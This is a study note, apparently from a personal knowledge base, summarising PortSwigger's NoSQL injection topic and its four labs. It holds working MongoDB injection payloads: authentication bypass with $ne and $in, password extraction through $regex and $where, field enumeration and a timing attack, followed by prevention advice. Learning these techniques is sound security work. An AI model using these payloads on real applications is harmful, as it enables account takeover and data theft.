---
tags: [hacking, web, portswigger, nosql-injection]
type: vulnerability-category
source: https://portswigger.net/web-security/nosql-injection
last-verified: 2026-08-25
---

# NoSQL injection

## Up
- [[PortSwigger]]

## What it is
NoSQL injection lets an attacker interfere with the queries an application makes to a NoSQL database (e.g. MongoDB). It can bypass authentication, read/modify data, cause DoS, or run server-side code. Two forms:
- **Syntax injection** — break out of the query syntax (like classic SQLi, but the language varies).
- **Operator injection** — smuggle NoSQL query operators (`$ne`, `$gt`, `$where`, `$regex`, `$in`) into the query.

## Detecting syntax injection (MongoDB)
Fuzz an input with characters that have meaning in the query, e.g.:
```
'"`{
;$Foo}
$Foo \xYZ
```
Watch for errors or behaviour changes. Confirm with boolean conditions injected into a string context:
```
category=fizzy' && 0 && 'x     (false)
category=fizzy' && 1 && 'x     (true)
```
An always-true override:
```
category=fizzy'||'1'=='1
```
A null byte can make the engine ignore the rest of the query: `fizzy'%00`.

## Operator injection
Where input is placed into a JSON query, replace a string with an operator object.

Login bypass — original vs injected:
```json
{"username":"wiener","password":"peter"}
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```
Target a specific account:
```json
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
```
In URL-encoded params, use bracket syntax: `username[$ne]=invalid`.

## Extracting data
- **`$regex`** — recover a value character by character:
  ```json
  {"username":"admin","password":{"$regex":"^a.*"}}
  ```
  extend the prefix as each character is confirmed.
- **`$where` (JavaScript)** — evaluate expressions on the record:
  ```
  admin' && this.password[0] == 'a' || 'a'=='b
  ```
- **Field discovery** — `Object.keys(this)[0].match('^.{0}a.*')` inside `$where` to learn field names.
- **Timing** — run a JS loop/`sleep(5000)` only when a condition holds, and infer from delay:
  ```
  admin'+function(x){if(x.password[0]==="a"){sleep(5000)}}(this)+'
  ```

## Prevention
- Validate/sanitize input against an **allow-list**; reject query operators where a string is expected (allow-list acceptable object keys).
- Use the driver's parameterized/typed query APIs rather than building queries from raw input.

## Labs
4 labs. Verify exact titles against the live page.

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| Detecting NoSQL injection | Apprentice | Inject `'` then a boolean payload to alter the category filter. | |
| Exploiting NoSQL operator injection to bypass authentication | Apprentice | `password[$ne]=` / `{"$ne":""}` to log in as admin. | |
| Exploiting NoSQL injection to extract data | Practitioner | Use `$regex` / `$where` to leak the admin password char-by-char. | |
| Exploiting NoSQL operator injection to extract unknown fields | Practitioner | Enumerate field names via `$where` + `Object.keys`, then extract. | |
